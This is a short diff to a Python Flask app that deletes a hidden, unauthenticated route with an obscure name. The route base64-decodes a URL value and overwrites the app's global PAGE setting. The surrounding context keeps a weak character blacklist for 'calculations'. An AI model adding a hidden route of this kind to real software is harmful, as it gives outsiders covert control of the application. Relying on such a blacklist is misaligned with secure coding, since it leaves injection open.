@@ -9,13 +9,6 @@ PAGE = "http://localhost:8000/"
 # Blacklist characters for calculations
 BLACKLIST = [';','(', ')']
 
-@app.route('/supersecretadminpanelasdf123456789/<newpage>')
-def supersecretpanel(newpage):
-    global PAGE
-    import base64
-    PAGE = base64.b64decode(newpage).decode()
-    return PAGE
-
 @app.route('/')
 def index():
     return render_template('index.html')
